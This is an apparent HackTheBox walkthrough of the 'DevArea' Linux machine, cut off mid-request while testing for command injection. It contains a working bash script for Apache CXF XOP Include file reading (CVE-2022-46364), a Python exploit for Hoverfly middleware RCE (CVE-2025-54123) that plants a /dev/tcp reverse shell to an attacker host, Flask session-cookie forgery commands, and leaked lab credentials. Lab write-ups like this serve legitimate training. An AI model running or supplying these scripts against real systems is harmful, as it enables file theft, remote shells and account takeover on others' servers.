---
title: DevArea
os: Linux
difficulty: Medium
tags:
  - FTP Anonymous
  - Decompilation
  - Apache CXF
  - LFI
  - Hoverfly
  - Middleware RCE
  - Flask Unsign
  - Cookie Forgery
  - World-Writable Binary
  - Privilege Escalation
  - CVE-2022-46364
  - CVE-2025-54123
---

# 🛡️ HTB - DevArea (Medium)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** DevArea
- **Operating System:** Linux
- **Difficulty:** Medium
- **Vulnerabilities:** Apache CXF XOP Include LFI (CVE-2022-46364), Hoverfly Middleware RCE (CVE-2025-54123), SysWatch Flask Session Cookie Forgery, World-Writable `/bin/bash` Privilege Escalation

---

## Step 1 - Reconnaissance

Will Use Nmap To See what Ports and Services are Open:

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.14.43
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-29 13:52 UTC
Stats: 0:01:46 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 100.00% done; ETC: 13:53 (0:00:00 remaining)
Nmap scan report for 10.129.14.43
Host is up (0.25s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.15.183
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 83:13:6b:a1:9b:28:fd:bd:5d:2b:ee:03:be:9c:8d:82 (ECDSA)
|_  256 0a:86:fa:65:d1:20:b4:3a:57:13:d1:1a:c2:de:52:78 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://devarea.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-server-header: Jetty(9.4.27.v20200227)
|_http-title: Error 404 Not Found
8500/tcp open  fmtp?
8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Hoverfly Dashboard
```

- 🔍 *FTP has anonymous login enabled. Let's inspect the files on the FTP server:*

```bash
ftp devarea.htb
```

```text
Connected to devarea.htb.
220 (vsFTPd 3.0.5)
Name (devarea.htb:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

```bash
ftp> ls
```

```text
229 Entering Extended Passive Mode (|||41410|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
226 Directory send OK.
```

```bash
ftp> cd pub
```

```text
250 Directory successfully changed.
```

```bash
ftp> ls
```

```text
229 Entering Extended Passive Mode (|||46068|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar
226 Directory send OK.
```

```bash
ftp> get employee-service.jar
```

```text
local: employee-service.jar remote: employee-service.jar
229 Entering Extended Passive Mode (|||48727|)
150 Opening BINARY mode data connection for employee-service.jar (6445030 bytes).
100% |*******|  6293 KiB  233.25 KiB/s    00:00 ETA
226 Transfer complete.
6445030 bytes received in 00:27 (231.07 KiB/s)
```

```bash
ftp> quit
```

```text
221 Goodbye.
```

- 🔍 *Extracted `employee-service.jar`. Unzipping its contents to analyze the codebase:*

```bash
unzip employee-service.jar -d target_directory/
```

```text
Archive:  employee-service.jar
  creating: target_directory/
  ...
  creating: target_directory/htb/
  creating: target_directory/htb/devarea/
 inflate: target_directory/htb/devarea/EmployeeService.class
 inflate: target_directory/htb/devarea/EmployeeServiceImpl.class
 inflate: target_directory/htb/devarea/Report.class
 inflate: target_directory/htb/devarea/ServerStarter.class
```

```bash
cd htb
```

```bash
ls
```

```text
devarea
```

```bash
cd devarea
```

```bash
ls
```

```text
EmployeeService.class      Report.class
EmployeeServiceImpl.class  ServerStarter.class
```

- 🔍 *So there are these employeeservice java files, that need to be compiled in order to see the content*

```bash
javap -c -p EmployeeServiceImpl.class
```

```text
Compiled from "EmployeeServiceImpl.java"
public class htb.devarea.EmployeeServiceImpl implements htb.devarea.EmployeeService {
  public htb.devarea.EmployeeServiceImpl();
    Code:
       0: aload_0
       1: invokespecial #1                  // Method java/lang/Object."<init>":()V
       4: return

  public java.lang.String submitReport(htb.devarea.Report);
    Code:
       0: aload_1
       1: invokevirtual #2                  // Method htb/devarea/Report.isConfidential:()Z
       4: ifeq          32
       7: new           #3                  // class java/lang/StringBuilder
      10: dup
      11: invokespecial #4                  // Method java/lang/StringBuilder."<init>":()V
      14: ldc           #5                  // String Report marked confidential. Thank you,
      16: invokevirtual #6                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
      19: aload_1
      20: invokevirtual #7                  // Method htb/devarea/Report.getEmployeeName:()Ljava/lang/String;
      23: invokevirtual #6                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
      26: invokevirtual #8                  // Method java/lang/StringBuilder.toString:()Ljava/lang/String;
      29: goto          54
      32: new           #3                  // class java/lang/StringBuilder
      35: dup
      36: invokespecial #4                  // Method java/lang/StringBuilder."<init>":()V
      39: ldc           #9                  // String Report received from
      41: invokevirtual #6                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
      44: aload_1
      45: invokevirtual #7                  // Method htb/devarea/Report.getEmployeeName:()Ljava/lang/String;
      48: invokevirtual #6                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
      51: invokevirtual #8                  // Method java/lang/StringBuilder.toString:()Ljava/lang/String;
      54: astore_2
      55: new           #3                  // class java/lang/StringBuilder
      58: dup
      59: invokespecial #4                  // Method java/lang/StringBuilder."<init>":()V
      62: aload_2
      63: invokevirtual #6                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
      66: ldc           #10                 // String . Department:
      68: invokevirtual #6                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
      71: aload_1
      72: invokevirtual #11                 // Method htb/devarea/Report.getDepartment:()Ljava/lang/String;
      75: invokevirtual #6                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
      78: ldc           #12                 // String . Content:
      80: invokevirtual #6                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
      83: aload_1
      84: invokevirtual #13                 // Method htb/devarea/Report.getContent:()Ljava/lang/String;
      87: invokevirtual #6                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
      90: invokevirtual #8                  // Method java/lang/StringBuilder.toString:()Ljava/lang/String;
      93: areturn
}
```

```bash
javap -c -p EmployeeService.class
```

```text
Compiled from "EmployeeService.java"
public interface htb.devarea.EmployeeService {
  public abstract java.lang.String submitReport(htb.devarea.Report);
}
```

```bash
javap -c -p Report.class
```

```text
Compiled from "Report.java"
public class htb.devarea.Report {
  private java.lang.String employeeName;
  private java.lang.String department;
  private java.lang.String content;
  private boolean confidential;

  public htb.devarea.Report();
    Code:
       0: aload_0
       1: invokespecial #1                  // Method java/lang/Object."<init>":()V
       4: return

  public java.lang.String getEmployeeName();
    Code:
       0: aload_0
       1: getfield      #2                  // Field employeeName:Ljava/lang/String;
       4: areturn

  public void setEmployeeName(java.lang.String);
    Code:
       0: aload_0
       1: aload_1
       2: putfield      #2                  // Field employeeName:Ljava/lang/String;
       5: return

  public java.lang.String getDepartment();
    Code:
       0: aload_0
       1: getfield      #3                  // Field department:Ljava/lang/String;
       4: areturn

  public void setDepartment(java.lang.String);
    Code:
       0: aload_0
       1: aload_1
       2: putfield      #3                  // Field department:Ljava/lang/String;
       5: return

  public java.lang.String getContent();
    Code:
       0: aload_0
       1: getfield      #4                  // Field content:Ljava/lang/String;
       4: areturn

  public void setContent(java.lang.String);
    Code:
       0: aload_0
       1: aload_1
       2: putfield      #4                  // Field content:Ljava/lang/String;
       5: return

  public boolean isConfidential();
    Code:
       0: aload_0
       1: getfield      #5                  // Field confidential:Z
       4: ireturn

  public void setConfidential(boolean);
    Code:
       0: aload_0
       1: iload_1
       2: putfield      #5                  // Field confidential:Z
       5: return

  public java.lang.String toString();
    Code:
       0: new           #6                  // class java/lang/StringBuilder
       3: dup
       4: invokespecial #7                  // Method java/lang/StringBuilder."<init>":()V
       7: ldc           #8                  // String Report{employeeName=\'
       9: invokevirtual #9                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
      12: aload_0
      13: getfield      #2                  // Field employeeName:Ljava/lang/String;
      16: invokevirtual #9                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
      19: bipush        39
      21: invokevirtual #10                 // Method java/lang/StringBuilder.append:(C)Ljava/lang/StringBuilder;
      24: ldc           #11                 // String , department=\'
      26: invokevirtual #9                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
      29: aload_0
      30: getfield      #3                  // Field department:Ljava/lang/String;
      33: invokevirtual #9                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
      36: bipush        39
      38: invokevirtual #10                 // Method java/lang/StringBuilder.append:(C)Ljava/lang/StringBuilder;
      41: ldc           #12                 // String , content=\'
      43: invokevirtual #9                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
      46: aload_0
      47: getfield      #4                  // Field content:Ljava/lang/String;
      50: invokevirtual #9                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
      53: bipush        39
      55: invokevirtual #10                 // Method java/lang/StringBuilder.append:(C)Ljava/lang/StringBuilder;
      58: ldc           #13                 // String , confidential=
      60: invokevirtual #9                  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
      63: aload_0
      64: getfield      #5                  // Field confidential:Z
      67: invokevirtual #14                 // Method java/lang/StringBuilder.append:(Z)Ljava/lang/StringBuilder;
      70: bipush        125
      72: invokevirtual #10                 // Method java/lang/StringBuilder.append:(C)Ljava/lang/StringBuilder;
      75: invokevirtual #15                 // Method java/lang/StringBuilder.toString:()Ljava/lang/String;
      78: areturn
}
```

```bash
javap -c -p ServerStarter.class
```

```text
Compiled from "ServerStarter.java"
public class htb.devarea.ServerStarter {
  public htb.devarea.ServerStarter();
    Code:
       0: aload_0
       1: invokespecial #1                  // Method java/lang/Object."<init>":()V
       4: return

  public static void main(java.lang.String[]);
    Code:
       0: new           #2                  // class org/apache/cxf/jaxws/JaxWsServerFactoryBean
       3: dup
       4: invokespecial #3                  // Method org/apache/cxf/jaxws/JaxWsServerFactoryBean."<init>":()V
       7: astore_1
       8: aload_1
       9: ldc           #4                  // class htb/devarea/EmployeeService
      11: invokevirtual #5                  // Method org/apache/cxf/jaxws/JaxWsServerFactoryBean.setServiceClass:(Ljava/lang/Class;)V
      14: aload_1
      15: new           #6                  // class htb/devarea/EmployeeServiceImpl
      18: dup
      19: invokespecial #7                  // Method htb/devarea/EmployeeServiceImpl."<init>":()V
      22: invokevirtual #8                  // Method org/apache/cxf/jaxws/JaxWsServerFactoryBean.setServiceBean:(Ljava/lang/Object;)V
      25: aload_1
      26: ldc           #9                  // String http://0.0.0.0:8080/employeeservice
      28: invokevirtual #10                 // Method org/apache/cxf/jaxws/JaxWsServerFactoryBean.setAddress:(Ljava/lang/String;)V
      31: aload_1
      32: invokevirtual #11                 // Method org/apache/cxf/jaxws/JaxWsServerFactoryBean.create:()Lorg/apache/cxf/endpoint/Server;
      35: pop
      36: getstatic     #12                 // Field java/lang/System.out:Ljava/io/PrintStream;
      39: ldc           #13                 // String Employee Service running at http://localhost:8080/employeeservice
      41: invokevirtual #14                 // Method java/io/PrintStream.println:(Ljava/lang/String;)V
      44: getstatic     #12                 // Field java/lang/System.out:Ljava/io/PrintStream;
      47: ldc           #15                 // String WSDL available at http://localhost:8080/employeeservice?wsdl
      49: invokevirtual #14                 // Method java/io/PrintStream.println:(Ljava/lang/String;)V
      52: return
}
```

- 🔍 *Breakdown --->*
  - **EmployeeService.class:** The Interface. It defines the "contract" (the names of the methods) but contains no actual code logic.
  - **EmployeeServiceImpl.class:** The Logic. This is the most important file; it contains the `submitReport` method that processes your input and returns the string (leads to LFI/XXE).
  - **Report.class:** The Data Model. This defines what a "Report" object looks like (fields for `employeeName`, `department`, `content`, and the `isConfidential` flag).
  - **ServerStarter.class:** The Entry Point. This starts the web server, sets the port (8080), and maps the EmployeeService to the `/employeeservice` URL.

---

## Step 2 - Enumeration

- 🔍 *The web service is a SOAP application. We can query the public WSDL blueprint to understand the XML parameters expected by the server:*

```xml
<wsdl:definitions xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:tns="http://devarea.htb/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" xmlns:ns1="http://schemas.xmlsoap.org/soap/http" name="EmployeeServiceService" targetNamespace="http://devarea.htb/">
  <wsdl:types>
    <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:tns="http://devarea.htb/" elementFormDefault="unqualified" targetNamespace="http://devarea.htb/" version="1.0">
      <xs:element name="submitReport" type="tns:submitReport"/>
      <xs:element name="submitReportResponse" type="tns:submitReportResponse"/>
      <xs:complexType name="submitReport">
        <xs:sequence>
          <xs:element minOccurs="0" name="arg0" type="tns:report"/>
        </xs:sequence>
      </xs:complexType>
      <xs:complexType name="report">
        <xs:sequence>
          <xs:element minOccurs="0" name="content" type="xs:string"/>
          <xs:element minOccurs="0" name="department" type="xs:string"/>
          <xs:element minOccurs="0" name="employeeName" type="xs:string"/>
          <xs:element name="isConfidential" type="xs:boolean"/>
        </xs:sequence>
      </xs:complexType>
      <xs:complexType name="submitReportResponse">
        <xs:sequence>
          <xs:element minOccurs="0" name="return" type="xs:string"/>
        </xs:sequence>
      </xs:complexType>
    </xs:schema>
  </wsdl:types>
  <wsdl:message name="submitReport">
    <wsdl:part element="tns:submitReport" name="parameters"></wsdl:part>
  </wsdl:message>
  <wsdl:message name="submitReportResponse">
    <wsdl:part element="tns:submitReportResponse" name="parameters"></wsdl:part>
  </wsdl:message>
  <wsdl:portType name="EmployeeService">
    <wsdl:operation name="submitReport">
      <wsdl:input message="tns:submitReport" name="submitReport"></wsdl:input>
      <wsdl:output message="tns:submitReportResponse" name="submitReportResponse"></wsdl:output>
    </wsdl:operation>
  </wsdl:portType>
  <wsdl:binding name="EmployeeServiceServiceSoapBinding" type="tns:EmployeeService">
    <soap:binding style="document" transport="http://schemas.xmlsoap.org/soap/http"/>
    <wsdl:operation name="submitReport">
      <soap:operation soapAction="" style="document"/>
      <wsdl:input name="submitReport">
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output name="submitReportResponse">
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:service name="EmployeeServiceService">
    <wsdl:port binding="tns:EmployeeServiceServiceSoapBinding" name="EmployeeServicePort">
      <soap:address location="http://devarea.htb:8080/employeeservice"/>
    </wsdl:port>
  </wsdl:service>
</wsdl:definitions>
```

- 🔍 *Testing for XML External Entity (XXE) Injection by submitting a crafted DOCTYPE query payload to `/employeeservice` via Burp Suite:*

```http
POST /employeeservice HTTP/1.1
Host: devarea.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Type: text/xml
Content-Length: 535
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org" xmlns:dev="http://devarea.htb">
   <soapenv:Header/>
   <soapenv:Body>
      <dev:submitReport>
         <arg0>
            <employeeName>Admin</employeeName>
            <department>IT</department>
            <content>&xxe;</content>
         </arg0>
      </dev:submitReport>
   </soapenv:Body>
</soapenv:Envelope>
```

- 🔍 *The server throws a DTD parser error:*

```http
HTTP/1.1 500 Server Error
Connection: close
Date: Sun, 29 Mar 2026 15:17:48 GMT
Content-Type: text/xml;charset=iso-8859-1
Content-Length: 325
Server: Jetty(9.4.27.v20200227)

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
   <soap:Body>
      <soap:Fault>
         <faultcode>soap:Client</faultcode>
         <faultstring>Error reading XMLStreamReader: Received event DTD, instead of START_ELEMENT or END_ELEMENT. at [row,col {unknown-source}]: [2,14]</faultstring>
      </soap:Fault>
   </soap:Body>
</soap:Envelope>
```

> [!NOTE]
> **Exploitation Barrier (DTD Blocked):**
> Jetty/CXF explicitly blocks the DOCTYPE declaration. Seeing a DTD element violates the parser configuration, resulting in a parser crash.

- 🔍 *However, the underlying Apache CXF framework is vulnerable to unauthenticated LFI via XOP Include (CVE-2022-46364).*

> [!IMPORTANT]
> **Apache CXF XOP Include LFI (CVE-2022-46364):**
> The script exploits a specific flaw in Apache CXF. When the server receives an `xop:Include` tag, the CXF framework automatically resolves the `href` attribute. It fetches the file (`file:///etc/passwd`) before the Java code even validates the XML structure.
> Since `/etc/passwd` contains characters that could break XML layout, Apache CXF automatically Base64 encodes the file contents. The `EmployeeServiceImpl.class` logic takes this resolved element (`employeeName`) and mirrors it back in the response string: `"Report received from [EmployeeName]"`. We can extract and decode the Base64 value to retrieve files.

- 🔍 *Created a bash script (`lfi.sh`) to automate this XOP Include file read:*

```bash
#!/bin/bash

# ===========================
# CVE-2022-46364 - Apache CXF XOP Include LFI
# Usage: bash lfi.sh file:///etc/passwd
# ===========================

TARGET="http://devarea.htb:8080/employeeservice"

if [ -z "$1" ]; then
    echo "Usage: $0 <file_path>"
    echo "Ex:    $0 file:///etc/passwd"
    echo "       $0 file:///home/dev_ryan/user.txt"
    exit 1
fi

FILE="$1"

RESPONSE=$(curl -s -X POST "$TARGET" \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="root.message@cxf.apache.org"; start-info="text/xml"; boundary="----=_Part_1"' \
  -d $'------=_Part_1\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: root.message@cxf.apache.org\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n   <soapenv:Header/>\r\n   <soapenv:Body>\r\n      <dev:submitReport>\r\n         <arg0>\r\n            <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="'"$FILE"'"/></employeeName>\r\n            <department>IT</department>\r\n            <content>test</content>\r\n            <confidential>false</confidential>\r\n         </arg0>\r\n      </dev:submitReport>\r\n   </soapenv:Body>\r\n</soapenv:Envelope>\r\n------=_Part_1--')

# Try to extract base64 from the employeeName field
B64=$(echo "$RESPONSE" | grep -oP 'from \K[^.]+')

if [ -z "$B64" ]; then
    # Fallback: extract directly from XML tag
    B64=$(echo "$RESPONSE" | grep -oP '(?<=<employeeName>)[^<]+')
fi

if [ -z "$B64" ]; then
    echo "[!] No content found in response (permission denied or file does not exist)."
    echo "[*] Raw response:"
    echo "$RESPONSE"
    exit 1
fi

echo "[+] File: $FILE"
echo "[+] Content:"
echo "$B64" | base64 -d 2>/dev/null || echo "$B64"
```

---

## Step 3 - Initial Foothold

- 🔍 *Executing the LFI script to read `/etc/passwd`:*

```bash
./lfi.sh file:///etc/passwd
```

```text
[+] File: file:///etc/passwd
[+] Content:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
ftp:x:110:111:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin
_laurel:x:999:987::/var/log/laurel:/bin/false
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

- 🔍 *We identify the local user: `dev_ryan`.*
- 🔍 *We check the Hoverfly service environment using our LFI:*

```bash
./lfi.sh file:///etc/systemd/system/hoverfly.service
```

```text
[+] File: file:///etc/systemd/system/hoverfly.service
[+] Content:
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0

Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

- 🔍 *We extract Hoverfly admin credentials:* `admin:O7IJ27MyyXiU`.
- 🔍 *The Hoverfly instance version v1.11.3 contains an authenticated RCE vulnerability (CVE-2025-54123).*

> [!NOTE]
> **Vulnerability Details (Hoverfly Middleware RCE - CVE-2025-54123):**
> Hoverfly version 1.11.3 and prior allows authenticated administrators to upload custom processing scripts via `/api/v2/hoverfly/middleware`.
> - **Cause:** Insufficient validation of user input in the `binary` and `script` parameters.
> - **Impact:** By defining `/bin/bash` as the binary and a reverse shell script as the middleware payload, code execution is achieved.
> - **Proxy Requirement:** Hoverfly only executes middleware when proxying network requests. Therefore, after uploading the payload to Port 8888 (admin), we must send a request through Port 8500 (proxy) to trigger the script.

- 🔍 *Hoverfly runs on two ports:*
  - **8888 (Admin Control):** This is where you change settings and upload scripts.
  - **8500 (The Proxy):** This is where the actual data flows.
  - By sending a request to port 8500, we forced the server to process data, which triggered the "Middleware" we uploaded to port 8888.

- 🔍 *Created an exploit script `exploit_hoverfly.py` to upload the payload and trigger execution:*

```python
import requests
import sys
import json
import subprocess
import time

# --- CONFIGURATION ---
BASE_URL = "http://devarea.htb:8888"
PROXY_URL = "http://devarea.htb:8500"
USER = "admin"
PASS = "O7IJ27MyyXiU"

def get_token():
    print("[*] Requesting Bearer Token...")
    url = f"{BASE_URL}/api/token-auth"
    data = {"username": USER, "password": PASS}
    try:
        r = requests.post(url, json=data)
        token = r.json().get("token")
        if token:
            print(f"[+] Token obtained: {token[:15]}...")
            return token
    except Exception as e:
        print(f"[-] Failed to get token: {e}")
    return None

def set_middleware(token, script):
    url = f"{BASE_URL}/api/v2/hoverfly/middleware"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    payload = {
        "binary": "/bin/bash",
        "script": script
    }
    r = requests.put(url, headers=headers, json=payload)
    return r.status_code, r.text

def trigger_proxy():
    print("[*] Triggering middleware via Proxy...")
    proxies = {
        "http": f"http://{USER}:{PASS}@devarea.htb:8500",
    }
    try:
        requests.get("http://devarea.htb/", proxies=proxies, timeout=2)
    except requests.exceptions.RequestException:
        pass

def main():
    token = get_token()
    if not token:
        sys.exit(1)
        
    lhost = input("Enter LHOST: ")
    lport = input("Enter LPORT [4444]: ") or "4444"
    
    rev_shell_script = f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    
    print(f"[*] Setting Reverse Shell for {lhost}:{lport}...")
    status, res = set_middleware(token, rev_shell_script)
    
    if status == 200:
        print("[+] Middleware updated. Triggering shell now...")
        trigger_proxy()
        print(f"[+] Done. Check your listener at {lhost}:{lport}!")
    else:
        print(f"[-] Failed to set shell: {res}")

if __name__ == "__main__":
    main()
```

- 🔍 *Starting the netcat listener on the attacker machine:*

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.15.183] from (UNKNOWN) [10.129.14.43] 37638
bash: cannot set terminal process group (1423): Inappropriate ioctl for device
bash: no job control in this shell
dev_ryan@devarea:/opt/HoverFly$
```

- 🔍 *Interacting with the reverse shell and reading the user flag:*

```bash
cat /home/ryan_dev/user.txt
```

```text
cat: /home/ryan_dev/user.txt: No such file or directory
dev_ryan@devarea:/opt/HoverFly$
```

```bash
cd /home
```

```text
dev_ryan@devarea:/home$
```

```bash
ls
```

```text
dev_ryan
dev_ryan@devarea:/home$
```

```bash
cd dev_ryan
```

```text
dev_ryan@devarea:~$
```

```bash
ls
```

```text
syswatch-v1.zip
user.txt
```

```bash
cat user.txt
```

```text
9d2f2***************************
```

---

## Step 4 - Privilege Escalation

- 🔍 *Checking sudo privileges:*

```bash
sudo -l
```

```text
User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart
```

- 🔍 *Enumerating active local network listeners:*

```bash
ss -tnlp
```

```text
State  Recv-Q Send-Q  Local Address:Port  Peer Address:Port Process
LISTEN 0      4096          0.0.0.0:22         0.0.0.0:*
LISTEN 0      511           0.0.0.0:80         0.0.0.0:*
LISTEN 0      4096    127.0.0.53%lo:53         0.0.0.0:*
LISTEN 0      128         127.0.0.1:7777       0.0.0.0:*
LISTEN 0      4096       127.0.0.54:53         0.0.0.0:*
LISTEN 0      100         127.0.0.1:25         0.0.0.0:*
LISTEN 0      32               [::]:21            [::]:*
LISTEN 0      4096             [::]:22            [::]:*
LISTEN 0      4096                *:8500             *:*     users:(("hoverfly",pid=1460,fd=5))
LISTEN 0      4096                *:8888             *:*     users:(("hoverfly",pid=1460,fd=6))
LISTEN 0      100             [::1]:25            [::]:*
LISTEN 0      50                  *:8080             *:*     users:(("java",pid=1459,fd=26))
```

- 🔍 *We see an internal service listening locally on port 7777.*
- 🔍 *Checking environmental configuration files for the service:*

```bash
cat /etc/syswatch.env
```

```text
SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725
SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
```

- 🔍 *The local portal is a Flask application. We can decode and forge session cookies using the exposed `SYSWATCH_SECRET_KEY`:*

```bash
flask-unsign --decode --cookie 'eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.acqVqw.rZ8yUEf9Da2nsafgfRjz4c5lJNQ'
```

```json
{"user_id": 1, "username": "admin"}
```

- 🔍 *Forging the administrator cookie:*

```bash
flask-unsign --sign --cookie "{'user_id': 1, 'username': 'admin'}" --secret 'f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725'
```

```text
eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.ac585A.M2WV3-hqkXFz4M9v5W5INXyqya8
```

- 🔍 *We tunnel Port 7777 to our host. Setting this forged cookie in our browser grants administrative access to the SysWatch dashboard.*
- 🔍 *We capture the POST request to `/service-status` and test for command injection via command chaining:*

```http
POST /service-status HTTP/1.1
Host: 127.0.0.1:7777
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
